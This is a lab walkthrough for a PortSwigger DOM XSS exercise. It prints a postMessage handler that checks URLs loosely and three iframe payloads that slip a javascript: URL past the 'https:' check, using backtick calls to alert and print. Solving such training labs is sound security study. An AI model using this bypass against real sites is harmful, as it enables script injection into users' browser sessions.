
# DOM XSS using web messages and a JavaScript URL

This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. 

To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

---------------------------------------------

References: 

- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source

- https://portswigger.net/web-security/cross-site-scripting/dom-based

- https://stackoverflow.com/questions/24078332/is-it-secure-to-use-window-location-href-directly-without-validation

---------------------------------------------

Generated link: https://0a0300fb03ec541d83b0e1af005a0096.web-security-academy.net/


Vulnerable code:



![img](images/DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL/1.png)

```
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```

If the payload contains “http:” or “https:”, it will redirect to that page.


Our payload in the exploit server:

```
<iframe src="https://0a0300fb03ec541d83b0e1af005a0096.web-security-academy.net/" onload="this.contentWindow.postMessage('https://as.com','*')" style="width:100%;height:100%">
```

When we click “View”, it redirects to as.com:



![Pobre Luis Enrique](images/DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL/2.png)

We can execute Javascript code with javascript:alert(1). As there are already nested quotes and double quotes we can use the character “`” to create an alert message with the previous url, so the payload wil still have “https:”:

```
<iframe src="https://0a0300fb03ec541d83b0e1af005a0096.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert`https://as.com`','*')" style="width:100%;height:100%">
```



![img](images/DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL/3.png)

If we change the payload to print the page:

```
<iframe src="https://0a0300fb03ec541d83b0e1af005a0096.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print`https://as.com`','*')" style="width:100%;height:100%">
```



![img](images/DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL/4.png)
